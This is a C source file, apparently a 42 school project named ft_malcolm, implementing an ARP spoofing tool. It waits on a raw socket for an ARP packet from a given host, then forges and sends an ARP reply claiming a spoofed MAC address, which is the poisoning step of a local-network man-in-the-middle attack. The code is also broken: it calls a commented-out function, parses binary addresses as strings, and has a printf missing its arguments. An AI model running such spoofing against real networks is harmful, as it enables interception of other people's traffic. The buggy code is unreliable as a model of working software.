/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_malcolm.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/01/16 17:11:24 by guferrei          #+#    #+#             */
/*   Updated: 2024/03/25 15:11:28 by guferrei         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <netdb.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#include <arpa/inet.h>

#include <netinet/ip.h>

#include <string.h>

#include <bits/ioctls.h>

#include "libft/libft.h"

#define NI_MAXHOST 1025
#define NI_MAXSERV 32
#define TRUE 1
#define FALSE 0
#define IPv4 4
#define MAC 6
#define ETH_HDRLEN 14	// Ethernet header length
#define IP4_HDRLEN 20	// IPv4 header length
#define ARP_HDRLEN 28	// ARP header length

struct ether_hdr {
	u_int8_t	dhost[ETH_ALEN];
	u_int8_t	shost[ETH_ALEN];
	u_int16_t	type;
} _ether_hdr;

typedef struct arp_hdr {
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
} _arp_hdr;

struct ether_arp {
	struct ether_hdr	ether;
	struct arp_hdr		arp;
} _ether_arp;

// struct ifaddrs *findAvailableInterface(void) {
// 	struct ifaddrs *ifaddr;
// 	int family;
// 	int s;
// 	char host[NI_MAXHOST];

// 	if (getifaddrs(&ifaddr) == -1) {
// 		perror("getifaddrs");
// 		return NULL;
// 	}

// 	return (ifaddr);
// }

int isValidInput(int argc, char **argv) {
	if (argc != 5)
		return (FALSE);
	
	// validate_ip(argv[1]);
	// validate_mac(argv[2]);
	// validate_ip(argv[3]);
	// validate_mac(argv[4]);

	return (TRUE);
}

uint8_t	*set_ip(char *input) {
	uint8_t	*buf;
	int		status;

	buf = calloc(sizeof(struct in_addr), sizeof(struct in_addr));

	status = inet_pton(AF_INET, input, buf);

	if (status <= 0) {
		free(buf);
		return NULL;
	}

	return (buf);
}

int hex2num(char c)
{
	if (c >= '0' && c <= '9')
		return c - '0';
	if (c >= 'a' && c <= 'f')
		return c - 'a' + 10;
	if (c >= 'A' && c <= 'F')
		return c - 'A' + 10;
	return -1;
}

uint8_t	*set_mac(char *input) {
	uint8_t	*buf;
	int i;

	buf = calloc(7 * sizeof(uint8_t), 7 * sizeof(uint8_t));
	i = 0;

	while (i < 6) {
		int a;
		int b;

		a = hex2num(*input++);
		b = hex2num(*input++);

		if (a < 0 || b < 0 || (i < 5 && *input++ != ':'))
			return NULL;

		buf[i] = (a << 4) | b;
		i++;
	}

	return buf;
}

uint8_t *allocate_ustrmem(int len) {
	void *tmp;

	if (len <= 0) {
		fprintf(stderr, "ERROR: Cannot allocate memory because len = %i in allocate_ustrmem().\n", len);
		exit(EXIT_FAILURE);
	}

	tmp = (uint8_t *)malloc(len * sizeof(uint8_t));
	if (tmp != NULL) {
		memset(tmp, 0, len * sizeof(uint8_t));
		return (tmp);
	}

	else {
		fprintf(stderr, "ERROR: Cannot allocate memory for array allocate_ustrmem().\n");
		exit(EXIT_FAILURE);
	}
}

// char *findAvailableInterface(void) {
// 	struct ifaddrs *ifaddr;
// 	int family, s;
// 	char *if_name;
// 	char host[NI_MAXHOST];

// 	if_name = NULL;

// 	if (getifaddrs(&ifaddr) == -1) {
// 		perror("getifaddrs");
// 		exit(EXIT_FAILURE);
// 	}

// 	for (struct ifaddrs *ifa = ifaddr; ifa != NULL;
// 		 ifa = ifa->ifa_next) {
// 		if (ifa->ifa_addr == NULL)
// 			continue;

// 		if (ifa->ifa_addr->sa_family == AF_INET || ifa->ifa_addr->sa_family == AF_INET6) {
// 			if_name = ft_strdup(ifa->ifa_name);
// 			break;
// 		}
// 	}

// 	freeifaddrs(ifaddr);
// 	return(if_name);
// }

int	is_equal_address(uint8_t *ip_a, uint8_t *ip_b, int flag) {
	int i;

	i = 0;
	while (i < flag) {
		if (ip_a[i] != ip_b[i])
			return FALSE;
		i++;
	}
	return TRUE;
}

struct arp_hdr *recover_arp_request(uint8_t *target ,uint8_t *ip, uint8_t *mac) {
	int sd;
	uint8_t *ether_frame;
	struct arp_hdr *arp_request;

	ether_frame = allocate_ustrmem(IP_MAXPACKET);

	sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sd < 0) {
		printf("Error getting socket descriptor\n");
		exit(1);
	}

	arp_request = (struct arp_hdr *) (ether_frame + 6 + 6 + 2);
	while (((((ether_frame[12]) << 8) + ether_frame[13]) != ETH_P_ARP) ||
		(ntohs(arp_request->opcode) != ARPOP_REPLY)) {

		if (recv(sd, ether_frame, IP_MAXPACKET, 0) < 0) {
			printf("recv() failed:");
			exit(EXIT_FAILURE);
		}

		if (is_equal_address(target, arp_request->target_ip, IPv4) &&
			is_equal_address(ip, arp_request->sender_ip, IPv4) &&
			is_equal_address(mac, arp_request->sender_mac, MAC)) {
			printf("\nREQUEST RECOVERED SUCCESSFULLY!!!!\n\n");
			close(sd);
			return (arp_request);
		}
	}

	close(sd);
	return (NULL);
}

void	print_ip_n_mac(uint8_t *ip, uint8_t *mac) {
	if (ip) {
		printf ("IP: %u.%u.%u.%u\n",
			ip[0],
			ip[1],
			ip[2],
			ip[3]);
	}

	if (mac) {
		printf ("MAC: ");
		for (int i=0; i<6; i++) {
			printf ("%02x:", mac[i]);
		}
		printf("\n");
	}
}

static int	__hex_char_to_int(char c) {
	if (c >= '0' && c <= '9')
		return (c - '0');
	else if (c >= 'a' && c <= 'f')
		return (c - 'a' + 10);
	else if (c >= 'A' && c <= 'F')
		return (c - 'A' + 10);
	else
		return (-1);
}

static int	__parse_hex_byte(const char *str) {
	int tens = __hex_char_to_int(str[0]);
	int ones = __hex_char_to_int(str[1]);

	if (tens < 0 || ones < 0)
		return (-1);
	return ((tens << 4) | ones);
}

int	mac_str_to_binary(const char *str, unsigned char *binary) {
	const char *ptr = str;

	for (int i = 0; i < 6; i++)
	{
		int byte = __parse_hex_byte(ptr);
		if (byte < 0)
			return (-1);
		binary[i] = byte;
		ptr += 3;
	}
	return (0);
}

void	print_ip(uint8_t *ip) {
	printf ("IP: %u.%u.%u.%u",
			ip[0],
			ip[1],
			ip[2],
			ip[3]);
}

void	print_mac(uint8_t *mac) {
	for (int i=0; i<6; i++) {
			printf ("%02x:", mac[i]);
	}
}

void	print_request(struct ether_arp *request) {
	printf("Ether\n\tdhost: ");
	print_mac(request->ether.dhost);
	printf("\n\tshost: ");
	print_mac(request->ether.shost);
	printf("\n\ttype: %u\n\n", request->ether.type);

	printf("Arp\n\thtype: %u\n\tptype: %u\n\thlen: %u\n\thtype: %u\n\topcode: %u\n\t");
	printf("sender_mac: ");
	print_mac(request->arp.sender_mac);
	printf("\n\tsender_ip: ");
	print_ip(request->arp.sender_ip);
	printf("\n\ttarget_mac: ");
	print_mac(request->arp.target_mac);
	printf("\n\ttarget_ip: ");
	print_ip(request->arp.target_ip);
}

// int	sendSpoofedArpToTarget(struct arp_hdr *arp_request, char *interface, uint8_t *spoofed_mac) {
// 	struct arp_hdr *spoofed_request;
// 	struct ether_arp *arp_response;
// 	struct sockaddr_ll device;
// 	struct addrinfo hints;
// 	int sd;

// 	arp_response = ft_calloc(1, sizeof(struct ether_arp));

// 	device.sll_family = AF_PACKET;
// 	memcpy(device.sll_addr, spoofed_mac, 6 * sizeof(uint8_t));
// 	device.sll_halen = 6;

// 	memset(&hints, 0, sizeof(struct addrinfo));
// 	hints.ai_family = AF_INET;
// 	hints.ai_socktype = SOCK_STREAM;
// 	hints.ai_flags = hints.ai_flags | AI_CANONNAME;

// 	spoofed_request = malloc(sizeof(struct arp_hdr));



// 	ft_memcpy(spoofed_request->sender_mac, spoofed_mac, 4 * sizeof(uint8_t));
// 	if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
// 		perror("socket() failed ");
// 		return(EXIT_FAILURE);
// 	}

// 	if (sendto(sd, arp_request, sizeof(struct ether_arp), 0, (struct sockaddr *)&device, sizeof(device)) < 0) {
// 		perror("sendto() failed");
// 		return(EXIT_FAILURE);
// 	}

// 	print_request(arp_request);

// 	close(sd);
// 	printf("ARP Request sended to source successfully\n");
// 	printf("Preparing to send Spoofed ARP Response to target...\n\n");
// 	return (0);
// }

int	sendArpRequest(struct arp_hdr *arp_request, char *interface, uint8_t *source_ip, uint8_t *spoofed_mac) {
	int	sd, frame_length;
	struct ether_arp *arp_response;
	struct addrinfo hints;
	struct sockaddr_in *ipv4;
	struct sockaddr_ll device;
	uint8_t *ether_frame;

	if (sendSpoofedArpToTarget(arp_request, interface, spoofed_mac))
		printf("Error sending ARP Request to source");

	memset(&device, 0, sizeof(device));
	if ((device.sll_ifindex = if_nametoindex(interface)) == 0) {
		perror("if_nametoindex() failed to obtain interface index ");
		exit(EXIT_FAILURE);
	}

	arp_response = ft_calloc(1, sizeof(struct ether_arp));

	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = hints.ai_flags | AI_CANONNAME;

	ft_memcpy(arp_response->arp.sender_ip, arp_request->target_ip, 4 * sizeof(uint8_t));
	ft_memcpy(arp_response->arp.sender_mac, spoofed_mac, 6 * sizeof(uint8_t));
	ft_memcpy(arp_response->arp.target_ip, arp_request->sender_ip, 4 * sizeof(uint8_t));
	ft_memcpy(arp_response->arp.target_mac, arp_request->sender_mac, 6 * sizeof(uint8_t));

	device.sll_family = AF_PACKET;
	memcpy(device.sll_addr, spoofed_mac, 6 * sizeof(uint8_t));
	device.sll_halen = 6;

	mac_str_to_binary(arp_request->sender_mac, arp_response->ether.dhost);
	mac_str_to_binary(spoofed_mac, arp_response->ether.shost);
	arp_response->ether.type = htons(ETHERTYPE_ARP);

	arp_response->arp.htype = htons(ARPHRD_ETHER);
	arp_response->arp.ptype = htons(ETHERTYPE_IP);
	arp_response->arp.hlen = 6;
	arp_response->arp.plen = 4;
	arp_response->arp.opcode = htons(ARPOP_REPLY);
	mac_str_to_binary(arp_request->target_mac, arp_response->arp.sender_mac);
	inet_pton(AF_INET, arp_request->target_ip, arp_response->arp.sender_ip);
	mac_str_to_binary(arp_request->target_mac, arp_response->arp.target_mac);
	inet_pton(AF_INET, arp_request->target_ip, arp_response->arp.target_ip);

	if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		perror("socket() failed ");
		exit(EXIT_FAILURE);
	}

	if (sendto(sd, arp_response, sizeof(struct ether_arp), 0, (struct sockaddr *)&device, sizeof(device)) < 0) {
		perror("sendto() failed");
		exit(EXIT_FAILURE);
	}

	print_request(arp_response);

	printf("Finish\n");

	close(sd);
}

int main(int argc, char **argv) {
	struct arp_hdr *arp_request;
	char *interface;
	uint8_t *target_ip;
	uint8_t *target_mac;
	uint8_t *source_ip;
	uint8_t *source_mac;

	if (!isValidInput(argc, argv)) {
		printf("INVALID INPUT\n");
		exit(1);
	}

	source_ip = set_ip(argv[1]);
	source_mac = set_mac(argv[2]);
	target_ip = set_ip(argv[3]);
	target_mac = set_mac(argv[4]);

	if (!source_ip || !source_mac || !target_ip || !target_mac) {
		printf("ERROR!\n");
		exit(1);
	}


	arp_request = recover_arp_request(source_ip ,target_ip, target_mac);

	printf("Request Recovered of: ");
	print_ip_n_mac(arp_request->sender_ip, arp_request->sender_mac);
	printf("Request Sended to: ");
	print_ip_n_mac(arp_request->target_ip, arp_request->target_mac);
	printf("\n_______________________\n\n");

	sendArpRequest(arp_request, "eth0", source_ip, source_mac);
}